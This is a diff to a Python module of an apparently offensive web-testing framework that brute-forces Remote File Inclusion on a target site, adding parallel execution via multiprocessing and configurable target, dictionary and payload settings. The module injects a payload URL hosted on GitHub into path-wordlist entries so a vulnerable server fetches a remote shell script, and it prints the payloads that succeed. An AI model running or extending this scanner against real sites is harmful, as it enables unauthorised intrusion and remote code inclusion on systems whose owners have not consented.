@@ -21,18 +21,21 @@ from googlesearch import search
 import urllib.request
 from random import randint
 from time import sleep
+from multiprocessing import Pool, TimeoutError
+from core.methods.multiproc import listsplit
+from core.variables import processes
 from core.Core.colors import *
 from core.methods.tor import session
 
 info = "This module scans the target site for Remote File Inclusion vulnerabilities by either a specific attack, or by brute force."
 searchinfo = "Remote File Inclusion Scanner"
-properties = {}
+properties = {"PARAM":["Directory and Parameter to attack (eg /vuln/page.php?q=lmao)", " "], "PARALLEL":["Parallelise Attack? [1/0]", " "], "DICT":["Path to dictionary to be used in normal attacks (default: files/fuzz-db/rfi_paths.lst)", " "]}
 
 global web
 
 goog = []
 payloads = []
-payload_url = 'https://raw.githubusercontent.com/VainlyStrain/Vaile/master/runon.sh'
+payload_url = 'https://raw.githubusercontent.com/VainlyStrain/Vaile/master/tmp/Vaile'
 payload_1 = '#!/bin/sh'
 payload_2 = 'cd /opt/Vaile'
 payload_3 = 'python /opt/Vaile/Vaile.py'
@@ -41,9 +44,11 @@ def clear_cookie():
     fo = open(".google-cookie", "w")
     fo.close()
 
-def cust0x00(web):
-
-    web0 = input(GR+' [#] Enter the point scope parameter :> ')
+def cust0x00(web, parallel):
+    if properties["PARAM"][1] == " ":
+        web0 = input(GR+' [#] Enter the point scope parameter :> ')
+    else:
+        web0 = properties["PARAM"][1]
 
     if str(web0).startswith('/'):
         print(GR+' [!] Your input has a "/" in the beginning,..')
@@ -59,7 +64,7 @@ def cust0x00(web):
     i = input(O+' [#] Proceed to Brute Module? (y/n) :> ')
     if i == 'y' or i == 'Y':
         print(G+' [+] Moving on...')
-        brute0x00(web)
+        brute0x00(web, parallel)
     elif i == 'n' or i == 'N':
         print(G+' [+] RFi completed!')
         time.sleep(0.5)
@@ -172,44 +177,76 @@ def google_it (dork):
         time.sleep(0.7)
         goog.append(title)
 
-def brute0x00(web):
+def checkbrute(payloads, web):
+    success = []
     requests = session()
+    for pay in payloads:
+        try:
+            pay = pay.replace('XXpathXX',payload_url)
+            web0x00 = web + pay
+            req = requests.get(web0x00, allow_redirects=False, timeout=7, verify = False)
+            c = str(req.status_code)
+            if c == '200' and payload_1 in req.text and payload_2 in req.text and payload_3 in req.text:
+                print(G+' [+] Possible RFi at : '+O+web0x00+G+' (200)')
+                success.append(pay)
+            elif c == '404':
+                print(B+' [*] Checking dir : '+C+web0x00+R+' (404)')
+            elif c == '302':
+                print(B+' [*] Possible RFi : '+C+web0x00+GR+' (302)')
+            else:
+                print(O+' [*] Interesting response : '+GR+web0x00+O+' ('+c+')')
+
+        except:
+            print(R+' [-] Exception Encountered!')
+            pass
+    return success
+
+def brute0x00(web, parallel):
     try:
+        if properties["DICT"][1] == " ":
+            print(O+' [!] Enter path to payload file '+R+'(Default: files/fuzz-db/rfi_paths.lst)')
+            fi = input(O+' [#] Your input (Press Enter if default) :> ')
+        elif properties["DICT"][1].lower() == "none":
+            fi = ""
+        else:
+            fi = properties["DICT"][1]
+
+        if fi == '':
+            fi = 'files/fuzz-db/rfi_paths.lst'
+
         print(GR+' [*] Importing wordlist...')
-        if os.path.exists('files/fuzz-db/rfi_paths.lst') == True:
+        if os.path.exists(fi) == True:
             print(G+' [+] File path found!')
             time.sleep(0.6)
             print(O+' [*] Importing wordlist...')
-            with open('files/fuzz-db/rfi_paths.lst','r') as wew:
+            with open(fi,'r') as wew:
                 for w in wew:
                     w = w.strip('\n')
                     payloads.append(w)
             print(GR+' [*] Starting bruteforce...')
             time.sleep(0.7)
-            for pay in payloads:
-                try:
-                    pay = pay.replace('XXpathXX',payload_url)
-                    web0x00 = web + pay
-                    req = requests.get(web0x00, allow_redirects=False, timeout=7, verify = False)
-                    c = str(req.status_code)
-                    if c == '200' and payload_1 in req.text and payload_2 in req.text and payload_3 in req.text:
-                        print(G+' [+] Possible RFi at : '+O+web0x00+G+' (200)')
-                    elif c == '404':
-                        print(B+' [*] Checking dir : '+C+web0x00+R+' (404)')
-                    elif c == '302':
-                        print(B+' [*] Possible RFi : '+C+web0x00+GR+' (302)')
-                    else:
-                        print(O+' [*] Interesting response : '+GR+web0x00+O+' ('+c+')')
-
-                except:
-                    print(R+' [-] Exception Encountered!')
-                    pass
+            success = []
+            if not parallel:
+                success += checkbrute(payloads, web)
+            else:
+                paylists = listsplit(payloads, round(len(payloads)/processes))
+                with Pool(processes=processes) as pool:
+                    res = [pool.apply_async(checkbrute, args=(l,web,)) for l in paylists]
+                    for y in res:
+                        i = y.get()
+                        success += i
+            if success:
+                print(" [+] Remote File Inclusion found! Successful payloads:")
+                for i in success:
+                    print(i)
+            else:
+                print(R + "\n [-] No payload succeeded."+C)
 
     except Exception as e:
         print(R+' [-] Unexpected Exception Encountered!')
         print(R+' [-] Exception : '+str(e))
 
-def auto0x00(web):
+def auto0x00(web, parallel):
 
     try:
         print(C+' [-] Warning! You may get a captcha if you are being too frequent...')
@@ -229,16 +266,16 @@ def auto0x00(web):
             if i == 'y' or i == 'Y':
                 print(G+' [+] Loading the custom module...\n')
                 time.sleep(0.6)
-                cust0x00(web)
+                cust0x00(web, parallel)
                 print(G+' [+] Custom Module completed!')
                 time.sleep(0.7)
                 print(GR+' [*] Initializing module [3] Bruter...')
-                brute0x00(web)
+                brute0x00(web, parallel)
             elif i == 'n':
                 print(GR+' [*] Okay...')
                 time.sleep(0.7)
                 print(GR+' [*] Initializing module [3] Bruter...')
-                brute0x00(web)
+                brute0x00(web, parallel)
             else:
                 print(R+'\n [-] Sorry fam! You just typed SHIT!\n')
                 time.sleep(0.8)
@@ -260,6 +297,12 @@ def rfi(web):
 
     from core.methods.print import pvln
     pvln("remote file inclusion") 
+
+    if properties["PARALLEL"][1] == " ":
+        pa = input(" [?] Parallel Attack? (enter if not) :> ")
+        parallel = pa is not ""
+    else:
+        parallel = properties["PARALLEL"][1] == "1"
                 
     print(C+'    Choose from the options:\n')
     print(B+'    [1] Custom Targetting')
@@ -273,10 +316,10 @@ def rfi(web):
         web = web + '/'
 
     if m == '1':
-        cust0x00(web)
+        cust0x00(web, parallel)
 
     elif m == '2':
-        auto0x00(web)
+        auto0x00(web, parallel)
 
     else:
         print(G+' [+] U mad?')
